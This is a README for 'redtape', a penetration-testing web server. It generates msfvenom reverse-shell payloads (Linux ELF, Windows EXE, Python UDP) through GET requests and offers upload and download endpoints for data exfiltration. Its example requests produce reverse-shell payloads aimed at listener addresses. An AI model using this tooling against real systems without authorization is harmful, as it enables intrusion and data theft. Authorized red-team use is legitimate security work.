# redtape
A webserver designed around penetration testing. Allows the automatic generation and download of msfvenom payloads on a web request, and provides a simple file upload/download endpoint using raw GET and POST requests. It also logs all requests for data exfiltration.

---

# Usage
Start the server with `redtape`

Send http requests with this format: `http://<host>:<port>/<COMMAND>?<OPTIONS>`

## COMMAND msfvenom
Generates an msfvenom payload and returns it as a file download.
Options are passed as query parameters. You must pass PAYLOAD and LHOST.
When passing a PAYLOAD, you must pass either the full PAYLOAD ('linux/x64/shell_reverse_tcp') or an OS. When specifying an OS, the payload is shell_revrese_tcp, with a default ARCH of x64.

### EXAMPLE
Linux default payload (shell_reverse_tcp), default ARCH (x64) and default PORT (4444)  
`GET http://127.0.0.1/msfvenom?os=linux&format=elf&lhost=127.0.0.1`

Windows staged reverse TCP shell  
`GET http://127.0.0.1/msfvenom?payload=windows/x86/shell/reverse_tcp&format=exe&lhost=127.0.0.1`

Python reverse UDP shell  
`GET http://127.0.0.1/msfvenom?payload=python/shell_reverse_udp&lhost=192.168.45.100&lport=25565`

## COMMAND download
Download a file from DOWNLOAD_DIR

### EXAMPLE
Download DOWNLOAD_DIR/file.txt  
`GET http://127.0.0.1/download/file.txt`

## COMMAND upload
Accepts a file via the form data of a POST request and saves it to UPLOAD_DIR.

### EXAMPLE
Upload a file. The filename should be automatically specified in the post data.  
`POST http://127.0.0.1/upload`
